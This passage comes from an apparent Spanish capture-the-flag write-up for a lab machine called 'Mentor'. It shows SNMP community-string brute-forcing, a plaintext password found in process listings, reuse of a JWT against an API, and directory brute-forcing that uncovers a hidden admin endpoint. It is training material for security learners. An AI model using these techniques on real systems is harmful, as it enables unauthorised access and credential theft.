+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Quote with ID: <span style="color:#ff0;font-weight:bold">1</span> exists
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[+] Quote with ID: <span style="color:#ff0;font-weight:bold">2</span> exists
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[+] Quote with ID: <span style="color:#ff0;font-weight:bold">3</span> exists
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[+] Quote with ID: <span style="color:#ff0;font-weight:bold">4</span> exists
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>[+] Quote with ID: <span style="color:#ff0;font-weight:bold">5</span> exists</span></span></code></pre></div>
+<p>Nos reporta lo que ya sabíamos..</p>
+<h1 id="snmp-enumeration">SNMP Enumeration</h1>
+<p>Como con la API no he conseguido nada, voy a enumerar el otro puerto abierto a parte del SSH, el SNMP .</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ snmpbulkwalk -v 2c -c public 10.129.228.102
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic <span style="color:#007f7f">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (267066) 0:44:30.66
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>SNMPv2-MIB::sysContact.0 = STRING: Me &lt;admin@mentorquotes.htb&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>SNMPv2-MIB::sysName.0 = STRING: mentor
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>SNMPv2-MIB::sysServices.0 = INTEGER: <span style="color:#ff0;font-weight:bold">72</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>SNMPv2-MIB::sysORLastChange.0 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>SNMPv2-MIB::sysORDescr.2 = STRING: The MIB <span style="color:#fff;font-weight:bold">for</span> Message Processing and Dispatching.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions <span style="color:#fff;font-weight:bold">for</span> the SNMP User-based Security Model.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module <span style="color:#fff;font-weight:bold">for</span> SNMPv2 entities
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model <span style="color:#fff;font-weight:bold">for</span> SNMP.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module <span style="color:#fff;font-weight:bold">for</span> managing TCP implementations
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module <span style="color:#fff;font-weight:bold">for</span> managing UDP implementations
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module <span style="color:#fff;font-weight:bold">for</span> managing IP and ICMP implementations
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules <span style="color:#fff;font-weight:bold">for</span> managing SNMP Notification, plus filtering.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module <span style="color:#fff;font-weight:bold">for</span> logging SNMP Notifications.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>SNMPv2-MIB::sysORUpTime.1 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>SNMPv2-MIB::sysORUpTime.2 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>SNMPv2-MIB::sysORUpTime.3 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>SNMPv2-MIB::sysORUpTime.4 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>SNMPv2-MIB::sysORUpTime.5 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>SNMPv2-MIB::sysORUpTime.6 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>SNMPv2-MIB::sysORUpTime.7 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>SNMPv2-MIB::sysORUpTime.8 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>SNMPv2-MIB::sysORUpTime.9 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>SNMPv2-MIB::sysORUpTime.10 = Timeticks: (8) 0:00:00.08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (268106) 0:44:41.06
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2024-8-1,19:11:3.0,+0:0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: <span style="color:#ff0;font-weight:bold">393216</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: <span style="color:#0ff;font-weight:bold">&#34;BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span><span style="color:#0ff;font-weight:bold">&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: <span style="color:#ff0;font-weight:bold">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: <span style="color:#ff0;font-weight:bold">228</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: <span style="color:#ff0;font-weight:bold">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)</span></span></code></pre></div>
+<p>Tampoco es que veamos nada interesante.</p>
+<p>Al intentar con <code>onesixtyone</code> hacer fuerza bruta a las community strings, me di cuenta de que solamente probaba con la versión v1 de SNMP, y no podía especificar la v2c.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ onesixtyone 10.129.228.102 -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Scanning <span style="color:#ff0;font-weight:bold">1</span> hosts, <span style="color:#ff0;font-weight:bold">120</span> communities
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.228.102 [public] Linux mentor 5.15.0-56-generic <span style="color:#007f7f">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>10.129.228.102 [public] Linux mentor 5.15.0-56-generic <span style="color:#007f7f">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span></span></span></code></pre></div>
+<p>Y si capturas estas solicitudes con <code>wireshark</code> te das cuenta de la problemática.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Así que busqué una forma alternativa<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Utilizando esta herramienta&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 snmpbrute.py --file=/opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt --target=10.129.228.102</span></span></code></pre></div>
+
+
+
+
+
+
+<pre tabindex="0"><code>10.129.228.102 : 161 	Version (v1):	public
+10.129.228.102 : 161 	Version (v2c):	public
+10.129.228.102 : 161 	Version (v2c):	internal</code></pre>
+<p>Encontramos la community string <code>internal</code></p>
+<p>Y enumerando el SNMP&hellip;</p>
+<p>Vemos que si ganamos acceso a la máquina seguramente estemos en un contenedor.
+<code>IF-MIB::ifDescr.4 = STRING: docker0</code></p>
+<p>Encontramos que hay una base de datos <code>postgres</code> por detrás.
+<code>HOST-RESOURCES-MIB::hrSWRunName.1925 = STRING: &quot;postgres</code></p>
+<p>Y un servicio <code>login.py</code> que es raro..
+<code>HOST-RESOURCES-MIB::hrSWRunName.2090 = STRING: &quot;login.py&quot;</code></p>
+<p>Y encontramos un information leakage donde se descubre una contraseña.
+<code>HOST-RESOURCES-MIB::hrSWRunParameters.2090 = STRING: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;</code></p>
+<h1 id="foothold-container">Foothold (container)</h1>
+<p>Ahora podemos intentar conseguir un token JWT como el usuario <code>james</code>..</p>
+<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<h1 id="abusing-api">Abusing API</h1>
+<p>Ahora podemos intentar crear una frase.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X POST http://api.mentorquotes.htb/quotes/ -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> -H <span style="color:#0ff;font-weight:bold">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#0ff;font-weight:bold">&#39;{&#34;title&#34;: &#34;Testing&#34;, &#34;description&#34;: &#34;Testing&#34;}&#39;</span>| jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;title&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>  <span style="color:#0ff;font-weight:bold">&#34;description&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>  <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">6</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>}</span></span></code></pre></div>
+<p>Y vemos que se reporta en la página principal, en lo primero que pensé es en hacer un SSTI.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Pero no funcionó.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Así que enumerando usuarios en el endpoint de /users/
+encontramos otro usuario mas.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>    <span style="font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">1</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>    <span style="font-weight:bold">&#34;email&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;james@mentorquotes.htb&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>    <span style="font-weight:bold">&#34;username&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;james&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>  }<span style="color:#f00">,</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>  {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>    <span style="font-weight:bold">&#34;id&#34;</span>: <span style="color:#ff0;font-weight:bold">2</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>    <span style="font-weight:bold">&#34;email&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;svc@mentorquotes.htb&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    <span style="font-weight:bold">&#34;username&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;service_acc&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>  }</span></span></code></pre></div>
+<p>No me sirve de nada, y después de revisar todos los endpoints no conseguí nada.</p>
+<p>Así que cuando no consigues nada hay que seguir enumerando.</p>
+<p>Con <code>feroxbuster</code> pero utilizando otro diccionario, encontré un endpoint <code>/admin</code> que no estaba documentado en el Swagger.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ feroxbuster -u http://api.mentorquotes.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ff0;font-weight:bold">1</span> -t <span style="color:#ff0;font-weight:bold">100</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>....
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#ff0;font-weight:bold">307</span>      GET        0l        0w        0c http://api.mentorquotes.htb/admin =&gt; http://api.mentorquotes.htb/admin/</span></span></code></pre></div>
+<p>Uy, yo esto lo catalogaría como otro Information Leakage&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X GET http://api.mentorquotes.htb/admin/ -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;admin_funcs&#34;</span>: {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    <span style="color:#0ff;font-weight:bold">&#34;check db connection&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;/check&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    <span style="color:#0ff;font-weight:bold">&#34;backup the application&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;/backup&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>}</span></span></code></pre></div>
+<h2 id="check-endpoint">Check endpoint</h2>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X GET http://api.mentorquotes.htb/admin/check -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;details&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Not implemented yet!&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>}</span></span></code></pre></div>
+<p>Por aquí parece que no es..</p>
+<h2 id="backup-endpoint">Backup endpoint</h2>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X GET http://api.mentorquotes.htb/admin/backup -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> | jq
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;detail&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Method Not Allowed&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>}</span></span></code></pre></div>
+<p>Esto tiene mejor pinta..
